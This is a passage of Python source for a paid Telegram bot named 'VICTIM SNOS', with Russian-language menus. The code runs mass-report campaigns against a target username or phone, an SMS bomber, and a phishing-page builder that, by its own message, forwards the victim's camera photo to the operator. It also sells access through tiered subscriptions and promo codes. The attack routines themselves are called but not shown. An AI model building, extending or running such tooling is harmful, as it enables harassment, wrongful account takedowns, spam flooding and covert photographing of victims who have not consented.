            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"✅ <b>СНОС ЗАВЕРШЕН</b>\n\n"
                   f"📱 Телефон: <code>{phone}</code>\n"
                   f"📤 Отправлено: <b>{total_sent}</b>\n"
                   f"🔄 Раундов: {rounds}",
            reply_markup=get_main_menu(user_id)
        )
        
    except Exception as e:
        logger.error(f"Attack error: {e}")
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"❌ <b>ОШИБКА</b>",
            reply_markup=get_main_menu(user_id)
        )
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

@dp.callback_query(F.data == "snos_username")
async def snos_username_start(cb: types.CallbackQuery, state: FSMContext):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(cb.from_user.id, cb):
        return
    
    user_lock = await get_user_lock(cb.from_user.id)
    
    async with user_lock:
        if cb.from_user.id in active_attacks:
            await cb.answer("❌ Активная атака уже идет!", show_alert=True)
            return
        
        can_attack, remaining = await check_cooldown(cb.from_user.id)
        if not can_attack:
            await cb.answer(f"⏳ Подождите {int(remaining)} сек.", show_alert=True)
            return
    
    await state.set_state(AttackState.waiting_username)
    await cb.message.delete()
    
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [create_button("❌ Отмена", "snos_menu")]
    ])
    
    await cb.message.answer(
        "<b>🔱 VICTIM SNOS</b>\n\n"
        "👤 Введите username (без @):\n"
        "<i>Пример: username</i>",
        reply_markup=cancel_kb
    )

@dp.message(StateFilter(AttackState.waiting_username))
async def snos_username_received(msg: types.Message, state: FSMContext):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(msg.from_user.id, msg):
        return
    
    username = msg.text.strip().replace("@", "")
    await state.update_data(username=username)
    await state.set_state(AttackState.waiting_count)
    
    await msg.delete()
    await msg.answer(
        f"<b>🔱 VICTIM SNOS</b>\n\n"
        f"👤 Username: @{username}\n\n"
        f"Введите количество раундов (1-{MAX_ROUNDS}):"
    )

@dp.message(StateFilter(AttackState.waiting_count))
async def snos_username_count(msg: types.Message, state: FSMContext):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(msg.from_user.id, msg):
        return
    
    try:
        rounds = int(msg.text.strip())
        if rounds < 1 or rounds > MAX_ROUNDS:
            raise ValueError()
    except:
        await msg.delete()
        await send_message_with_banner(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
        return
    
    data = await state.get_data()
    username = data["username"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    user_lock = await get_user_lock(user_id)
    
    async with user_lock:
        if user_id in active_attacks:
            await send_message_with_banner(msg, "❌ Атака уже запущена!")
            return
        
        stop_event = asyncio.Event()
        active_attacks[user_id] = stop_event
    
    status_msg = await send_message_with_banner(
        msg,
        f"🎯 <b>СНОС ЗАПУЩЕН</b>\n\n"
        f"👤 Username: @{username}\n"
        f"🔄 Раунд: 0/{rounds}\n"
        f"📤 Жалоб: 0"
    )
    
    async def update_progress(current: int, total: int, reports: int):
        try:
            pool = user_pools.get(user_id)
            stats = pool.get_stats() if pool else {"available": 0, "total": 0}
            
            await status_msg.edit_caption(
                caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                       f"🎯 <b>СНОС АКТИВЕН</b>\n\n"
                       f"👤 Username: @{username}\n"
                       f"🔄 Раунд: {current}/{total}\n"
                       f"📤 Жалоб: {reports}\n"
                       f"📊 Сессий: {stats['available']}/{stats['total']}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]
                ])
            )
        except:
            pass
    
    try:
        total_reports = await snos_attack_username(
            user_id,
            username,
            rounds,
            stop_event,
            update_progress
        )
        
        set_cooldown(user_id)
        
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"✅ <b>СНОС ЗАВЕРШЕН</b>\n\n"
                   f"👤 Username: @{username}\n"
                   f"📤 Жалоб: <b>{total_reports}</b>\n"
                   f"🔄 Раундов: {rounds}",
            reply_markup=get_main_menu(user_id)
        )
        
    except Exception as e:
        logger.error(f"Attack error: {e}")
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"❌ <b>ОШИБКА</b>",
            reply_markup=get_main_menu(user_id)
        )
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

@dp.callback_query(F.data == "bomber_menu")
async def bomber_menu(cb: types.CallbackQuery, state: FSMContext):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(cb.from_user.id, cb):
        return
    
    user_lock = await get_user_lock(cb.from_user.id)
    
    async with user_lock:
        if cb.from_user.id in active_attacks:
            await cb.answer("❌ Активная атака уже идет!", show_alert=True)
            return
        
        can_attack, remaining = await check_cooldown(cb.from_user.id)
        if not can_attack:
            await cb.answer(f"⏳ Подождите {int(remaining)} сек.", show_alert=True)
            return
    
    await state.set_state(AttackState.waiting_phone)
    await cb.message.delete()
    
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [create_button("❌ Отмена", "main_menu")]
    ])
    
    await cb.message.answer(
        "<b>🔱 VICTIM SNOS</b>\n\n"
        "💣 <b>SMS БОМБЕР</b>\n\n"
        "📱 Введите номер телефона:",
        reply_markup=cancel_kb
    )

@dp.message(StateFilter(AttackState.waiting_phone))
async def bomber_phone(msg: types.Message, state: FSMContext):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(msg.from_user.id, msg):
        return
    
    phone = msg.text.strip()
    await state.update_data(phone=phone)
    await state.set_state(AttackState.waiting_count)
    
    await msg.delete()
    await msg.answer(
        f"<b>🔱 VICTIM SNOS</b>\n\n"
        f"📱 Телефон: <code>{phone}</code>\n\n"
        f"Введите количество раундов (1-5):"
    )

@dp.message(StateFilter(AttackState.waiting_count))
async def bomber_count(msg: types.Message, state: FSMContext):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(msg.from_user.id, msg):
        return
    
    try:
        rounds = int(msg.text.strip())
        if rounds < 1 or rounds > 5:
            raise ValueError()
    except:
        await msg.delete()
        await send_message_with_banner(msg, "❌ Введите число от 1 до 5!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    user_lock = await get_user_lock(user_id)
    
    async with user_lock:
        if user_id in active_attacks:
            await send_message_with_banner(msg, "❌ Атака уже запущена!")
            return
        
        stop_event = asyncio.Event()
        active_attacks[user_id] = stop_event
    
    status_msg = await send_message_with_banner(
        msg,
        f"💣 <b>БОМБЕР ЗАПУЩЕН</b>\n\n"
        f"📱 Телефон: <code>{phone}</code>\n"
        f"🔄 Раунд: 0/{rounds}\n"
        f"📨 Отправлено: 0"
    )
    
    async def update_progress(current: int, total: int, sent: int):
        try:
            await status_msg.edit_caption(
                caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                       f"💣 <b>БОМБЕР АКТИВЕН</b>\n\n"
                       f"📱 Телефон: <code>{phone}</code>\n"
                       f"🔄 Раунд: {current}/{total}\n"
                       f"📨 Отправлено: {sent}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]
                ])
            )
        except:
            pass
    
    try:
        total_sent = await bomber_attack(
            phone,
            rounds,
            user_id,
            stop_event,
            update_progress
        )
        
        set_cooldown(user_id)
        
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"✅ <b>БОМБЕР ЗАВЕРШЕН</b>\n\n"
                   f"📱 Телефон: <code>{phone}</code>\n"
                   f"📨 SMS: <b>{total_sent}</b>\n"
                   f"🔄 Раундов: {rounds}",
            reply_markup=get_main_menu(user_id)
        )
        
    except Exception as e:
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"❌ <b>ОШИБКА</b>",
            reply_markup=get_main_menu(user_id)
        )
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

@dp.callback_query(F.data == "phish_menu")
async def phish_menu(cb: types.CallbackQuery, state: FSMContext):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(cb.from_user.id, cb):
        return
    
    await state.set_state(AttackState.waiting_title)
    await cb.message.delete()
    
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [create_button("❌ Отмена", "main_menu")]
    ])
    
    await cb.message.answer(
        "<b>🔱 VICTIM SNOS</b>\n\n"
        "🎣 <b>ФИШИНГ</b>\n\n"
        "Введите заголовок страницы:\n"
        "<i>Например: Telegram Security Check</i>",
        reply_markup=cancel_kb
    )

@dp.message(StateFilter(AttackState.waiting_title))
async def phish_title(msg: types.Message, state: FSMContext):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(msg.from_user.id, msg):
        return
    
    title = msg.text.strip()
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    status_msg = await send_message_with_banner(
        msg,
        "🎣 <b>СОЗДАНИЕ СТРАНИЦЫ</b>\n\n"
        "⏳ Пожалуйста, подождите..."
    )
    
    page_id = hashlib.md5(f"{user_id}_{time.time()}".encode()).hexdigest()[:10]
    url = await create_phishing_page(title, user_id, page_id)
    
    if url:
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"✅ <b>СТРАНИЦА СОЗДАНА</b>\n\n"
                   f"🔗 Ссылка:\n<code>{url}</code>\n\n"
                   f"📸 При переходе жертвы по ссылке и разрешении камеры "
                   f"вы получите фото в этот чат.",
            reply_markup=get_main_menu(user_id)
        )
    else:
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"❌ <b>ОШИБКА СОЗДАНИЯ</b>\n\n"
                   f"Попробуйте позже",
            reply_markup=get_main_menu(user_id)
        )

@dp.message(F.photo)
async def handle_phish_photo(msg: types.Message):
    if msg.caption:
        for page_id, page in list(phish_pages.items()):
            if page_id in msg.caption and msg.chat.id == page.get("chat_id"):
                logger.info(f"Phishing photo received from {page_id}")
                await msg.reply(
                    "📸 <b>ФОТО ПОЛУЧЕНО!</b>\n\n"
                    f"ID страницы: <code>{page_id}</code>"
                )
                break

@dp.callback_query(F.data == "purchase_menu")
async def purchase_menu(cb: types.CallbackQuery):
    buttons = [
        [("💎 30 дней - 100₽", "buy_30d")],
        [("💎 60 дней - 200₽", "buy_60d")],
        [("👑 Навсегда - 400₽", "buy_forever")],
        [("🎁 Промокод", "use_promo")],
        [("◀️ НАЗАД", "main_menu")]
    ]
    
    await cb.message.edit_caption(
        caption="<b>🔱 VICTIM SNOS</b>\n\n"
               "<b>💰 ПРИОБРЕТЕНИЕ ДОСТУПА</b>\n\n"
               "Выберите тариф:",
        reply_markup=create_keyboard(buttons)
    )

@dp.callback_query(F.data.startswith("buy_"))
async def buy_subscription(cb: types.CallbackQuery):
    duration = cb.data.replace("buy_", "")
    
    prices = {
        "30d": ("30 дней", 100),
        "60d": ("60 дней", 200),
        "forever": ("Навсегда", 400)
    }
    
    name, price = prices[duration]
    
    await bot.send_invoice(
        chat_id=cb.from_user.id,
        title=f"VICTIM SNOS - {name}",
        description=f"Доступ к боту на {name}",
        payload=f"sub_{duration}",
        provider_token=PAYMENT_PROVIDER_TOKEN,
        currency="RUB",
        prices=[LabeledPrice(label=name, amount=price * 100)],
        start_parameter="victim_snos",
        protect_content=True
    )
    
    await cb.message.delete()
    await cb.message.answer(
        f"💳 <b>СЧЕТ ВЫСТАВЛЕН</b>\n\n"
        f"Тариф: {name}\n"
        f"Сумма: {price}₽"
    )

@dp.pre_checkout_query()
async def process_pre_checkout(pre_checkout_query: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@dp.message(F.successful_payment)
async def process_successful_payment(msg: types.Message):
    payload = msg.successful_payment.invoice_payload
    
    if payload.startswith("sub_"):
        duration = payload.replace("sub_", "")
        
        if duration == "forever":
            add_subscription(msg.from_user.id, forever=True)
            text = "навсегда"
        else:
            days = int(duration.replace("d", ""))
            add_subscription(msg.from_user.id, days=days)
            text = f"на {days} дней"
        
        await msg.answer(
            f"✅ <b>ОПЛАТА УСПЕШНА!</b>\n\n"
            f"Доступ активирован {text}\n"
            f"Используйте /start для начала работы"
        )

@dp.callback_query(F.data == "use_promo")
async def use_promo_start(cb: types.CallbackQuery, state: FSMContext):
    await state.set_state(PurchaseState.waiting_promo)
    await cb.message.delete()
    
    await cb.message.answer(
        "<b>🔱 VICTIM SNOS</b>\n\n"
        "🎁 Введите промокод:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("❌ Отмена", "purchase_menu")]
        ])
    )

@dp.message(StateFilter(PurchaseState.waiting_promo))
async def process_promo(msg: types.Message, state: FSMContext):
    code = msg.text.strip().upper()
    await msg.delete()
    await state.clear()
    
    if code in promo_codes:
        promo = promo_codes[code]
        if promo["uses"] > 0:
            add_subscription(msg.from_user.id, days=promo["days"])
            promo["uses"] -= 1
            save_promo_codes()
            
            await send_message_with_banner(
                msg,
                f"✅ Промокод активирован!\n"
                f"Доступ добавлен на {promo['days']} дней",
                get_main_menu(msg.from_user.id)
            )
        else:
            await send_message_with_banner(
                msg,
                "❌ Промокод больше не действителен",
                get_purchase_menu()
            )
    else:
        await send_message_with_banner(
            msg,
            "❌ Неверный промокод",
            get_purchase_menu()
        )

@dp.callback_query(F.data == "status")
async def status(cb: types.CallbackQuery):
    # ПРОВЕРКА ДОСТУПА
    if not await check_access_and_subscription(cb.from_user.id, cb):
        return
    
    user_id = cb.from_user.id
    user_id_str = str(user_id)
    
    if user_id_str in ALLOWED_USERS:
        expire = ALLOWED_USERS[user_id_str].get("expire_date", "неизвестно")
        if expire != "forever":
            try:
                expire_date = datetime.fromisoformat(expire)
                days_left = (expire_date - datetime.now()).days
                expire = f"{expire_date.strftime('%d.%m.%Y')} ({days_left} дн.)"
            except:
                pass
    else:
        expire = "Нет доступа"
    
    pool = user_pools.get(user_id)
    if pool and pool.is_ready:
        stats = pool.get_stats()
        sessions_text = f"📱 Сессий: {stats['available']}/{stats['total']}\n"
        sessions_text += f"💚 Здоровых: {stats['healthy']}"
    else:
        progress = pool.creation_progress if pool else 0
        sessions_text = f"🔄 Создание: {progress:.1f}%"
    
    can_attack, remaining = await check_cooldown(user_id)
    cooldown_text = f"✅ Готов к атаке" if can_attack else f"⏳ Кулдаун: {int(remaining)} сек"
    
    await cb.message.edit_caption(
        caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
               f"<b>📊 СТАТУС</b>\n\n"
               f"🆔 ID: <code>{user_id}</code>\n"
               f"📅 Подписка: {expire}\n"
               f"{cooldown_text}\n\n"
               f"<b>📈 СЕССИИ</b>\n"
               f"{sessions_text}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("◀️ НАЗАД", "main_menu")]
        ])
    )

@dp.callback_query(F.data == "stop")
async def stop_attack(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    
    if user_id in active_attacks:
        active_attacks[user_id].set()
        del active_attacks[user_id]
        await cb.answer("✅ Атака остановлена", show_alert=True)
    else:
        await cb.answer("❌ Нет активных атак", show_alert=True)

@dp.callback_query(F.data == "stop_attack")
async def stop_attack_button(cb: types.CallbackQuery):
    await stop_attack(cb)
    await cb.message.edit_caption(
        caption="<b>🔱 VICTIM SNOS</b>\n\n"
               "⏹ <b>АТАКА ОСТАНОВЛЕНА</b>",
        reply_markup=get_main_menu(cb.from_user.id)
    )

@dp.callback_query(F.data.startswith("check_sessions_"))
async def check_sessions(cb: types.CallbackQuery):
    user_id = int(cb.data.split("_")[2])
    
    if user_id != cb.from_user.id:
        await cb.answer("Это не ваши сессии!", show_alert=True)
        return
    
    pool = user_pools.get(user_id)
    
    if pool and pool.is_ready:
        stats = pool.get_stats()
        await cb.message.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"✅ Сессии готовы!\n"
                   f"📊 Доступно: {stats['available']}/{stats['total']}",
            reply_markup=get_main_menu(user_id)
        )
    else:
        progress = pool.creation_progress if pool else 0
        await cb.answer(f"Прогресс: {progress:.1f}%", show_alert=True)

# ---------- АДМИН ПАНЕЛЬ ----------
@dp.message(Command("admin"))
async def admin_cmd(msg: types.Message):
    await msg.delete()
    
    if msg.from_user.id != ADMIN_ID:
        await send_message_with_banner(
            msg,
            "❌ У вас нет доступа к админ-панели"
        )
        return
    
    buttons = [
        [("➕ Добавить", "admin_add")],
        [("➖ Удалить", "admin_remove")],
        [("🎁 Создать промокод", "admin_create_promo")],
        [("📋 Список", "admin_list")],
        [("📊 Статистика", "admin_stats")],
        [("◀️ НАЗАД", "main_menu")]
    ]
    
    await send_message_with_banner(
        msg,
        "<b>👑 АДМИН ПАНЕЛЬ</b>",
        create_keyboard(buttons, adjust=2)
    )

@dp.callback_query(F.data == "admin_add")
async def admin_add_start(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет доступа", show_alert=True)
        return
    
    await state.set_state(AdminState.waiting_user_id)
    await cb.message.delete()
    
    await cb.message.answer(
        "<b>👑 АДМИН</b>\n\n"
        "Введите ID пользователя:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("❌ Отмена", "admin_menu")]
        ])
    )

@dp.message(StateFilter(AdminState.waiting_user_id))
async def admin_add_user(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    
    try:
        user_id = int(msg.text.strip())
        add_subscription(user_id, forever=True)
        
        await msg.delete()
        await send_message_with_banner(
            msg,
            f"✅ Пользователь <code>{user_id}</code> добавлен навсегда",
            get_admin_menu()
        )
    except:
        await msg.delete()
        await send_message_with_banner(msg, "❌ Неверный ID!")
    
    await state.clear()

@dp.callback_query(F.data == "admin_create_promo")
async def admin_promo_start(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет доступа", show_alert=True)
        return
    
    await state.set_state(AdminState.waiting_promo_code)
    await cb.message.delete()
    
    await cb.message.answer(
        "<b>👑 АДМИН</b>\n\n"
        "Введите промокод:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("❌ Отмена", "admin_menu")]
        ])
    )

@dp.message(StateFilter(AdminState.waiting_promo_code))
async def admin_promo_code(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    
    code = msg.text.strip().upper()
    await state.update_data(promo_code=code)
    await state.set_state(AdminState.waiting_promo_days)
    
    await msg.delete()
    await msg.answer("Введите количество дней:")

@dp.message(StateFilter(AdminState.waiting_promo_days))
async def admin_promo_days(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    
    try:
        days = int(msg.text.strip())
        await state.update_data(promo_days=days)
        await state.set_state(AdminState.waiting_promo_uses)
        
        await msg.delete()
        await msg.answer("Введите количество использований:")
    except:
        await msg.delete()
        await send_message_with_banner(msg, "❌ Неверное число!")

@dp.message(StateFilter(AdminState.waiting_promo_uses))
async def admin_promo_uses(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    
    try:
        uses = int(msg.text.strip())
        data = await state.get_data()
        
        promo_codes[data["promo_code"]] = {
            "days": data["promo_days"],
            "uses": uses
        }
        save_promo_codes()
        
        await msg.delete()
        await send_message_with_banner(
            msg,
            f"✅ Промокод создан!\n\n"
            f"Код: <code>{data['promo_code']}</code>\n"
            f"Дней: {data['promo_days']}\n"
            f"Использований: {uses}",
            get_admin_menu()
        )
    except:
        await msg.delete()
        await send_message_with_banner(msg, "❌ Неверное число!")
    
    await state.clear()

@dp.callback_query(F.data == "admin_remove")
async def admin_remove_menu(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет доступа", show_alert=True)
        return
    
    if not ALLOWED_USERS:
        await cb.answer("Список пуст", show_alert=True)
        return
    
    buttons = []
    for uid in list(ALLOWED_USERS.keys())[:20]:
        buttons.append([(f"❌ Удалить {uid}", f"remove_{uid}")])
    
    buttons.append([("◀️ НАЗАД", "admin_menu")])
    
    await cb.message.edit_caption(
        caption="<b>👑 УДАЛЕНИЕ ПОЛЬЗОВАТЕЛЕЙ</b>",
        reply_markup=create_keyboard(buttons)
    )

@dp.callback_query(F.data.startswith("remove_"))
async def admin_remove_user(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    
    user_id = cb.data.replace("remove_", "")
    if user_id in ALLOWED_USERS:
        del ALLOWED_USERS[user_id]
        save_allowed_users()
        
        if int(user_id) in user_pools:
            pool = user_pools[int(user_id)]
            for session in pool.sessions:
                try:
                    await session.client.disconnect()
                except:
                    pass
            del user_pools[int(user_id)]
            
            session_dir = f"sessions/user_{user_id}"
            if os.path.exists(session_dir):
                shutil.rmtree(session_dir)
    
    await cb.message.edit_caption(
        caption=f"<b>👑 АДМИН</b>\n\n"
               f"✅ Пользователь <code>{user_id}</code> удален",
        reply_markup=get_admin_menu()
    )

@dp.callback_query(F.data == "admin_list")
async def admin_list(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет доступа", show_alert=True)
        return
    
    text = "<b>👑 ПОЛЬЗОВАТЕЛИ</b>\n\n"
    
    for uid, data in list(ALLOWED_USERS.items())[:30]:
        expire = data.get("expire_date", "неизвестно")
        if expire != "forever":
            try:
                expire = datetime.fromisoformat(expire).strftime("%d.%m.%Y")
            except:
                pass
        text += f"<code>{uid}</code> - {expire}\n"
    
    if not ALLOWED_USERS:
        text += "Пусто"
    
    await cb.message.edit_caption(
        caption=text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("◀️ НАЗАД", "admin_menu")]
        ])
    )

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет доступа", show_alert=True)
        return
    
    total_sessions = sum(len(pool.sessions) for pool in user_pools.values())
    ready_pools = sum(1 for pool in user_pools.values() if pool.is_ready)
    active_attacks_count = len(active_attacks)
    users_count = len(ALLOWED_USERS)
    
    text = (
        f"<b>👑 СТАТИСТИКА</b>\n\n"
        f"👥 Пользователей: {users_count}\n"
        f"⚔️ Активных атак: {active_attacks_count}\n"
        f"📱 Всего сессий: {total_sessions}\n"
        f"✅ Готовых пулов: {ready_pools}/{len(user_pools)}\n"
    )
    
    await cb.message.edit_caption(
        caption=text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("◀️ НАЗАД", "admin_menu")]
        ])
    )

def get_admin_menu() -> InlineKeyboardMarkup:
    buttons = [
        [create_button("◀️ НАЗАД", "admin_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ---------- ЗАПУСК ----------
async def on_startup():
    load_allowed_users()
    load_promo_codes()
    
    os.makedirs("sessions", exist_ok=True)
    
    logger.info("Bot started! Access control ENABLED")

async def main():
    await on_startup()
    
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
